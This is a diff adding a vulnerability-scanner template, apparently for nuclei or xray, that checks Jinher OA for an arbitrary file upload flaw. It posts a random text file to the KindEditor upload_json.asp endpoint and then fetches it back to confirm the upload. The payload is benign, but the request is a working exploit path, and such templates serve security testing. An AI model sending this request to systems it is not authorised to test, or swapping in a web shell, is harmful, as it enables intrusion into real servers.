@@ -1,0 +1,64 @@
+id: poc-yaml-jinher-oa-upload-json-asp-anyfile-upload
+info:
+  name: Jinhwa OA Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(8)}}"
+  t2: "{{rand_text_alphanumeric(4)}}"
+  t3: "{{base64(t2)}}"
+  dt_1: "{{date_time('2006')}}"
+  dt_2: "{{date_time('01')}}"
+  dt_3: "{{date_time('02')}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/c6/KindEditor1/asp/upload_json.asp?dir=file"
+    headers:
+      Content-Type: "multipart/form-data; boundary=---------------------------{{t1}}"
+    body: |-
+      -----------------------------{{t1}}
+      Content-Disposition: form-data; name="localUrl"
+
+
+      -----------------------------{{t1}}
+      Content-Disposition: form-data; name="imgFile"; filename="{{t2}}.txt"
+      Content-Type: image/png
+
+      {{t3}}
+      -----------------------------{{t1}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"url\":"
+    extractors:
+      - type: regex
+        name: file
+        part: body
+        group: 1
+        regex:
+          - "(?P<file>[0-9]{9,32}).txt"
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/c6/KindEditor1/asp/../attached/file/{{dt_1}}{{dt_2}}{{dt_3}}/{{file}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t3}}"
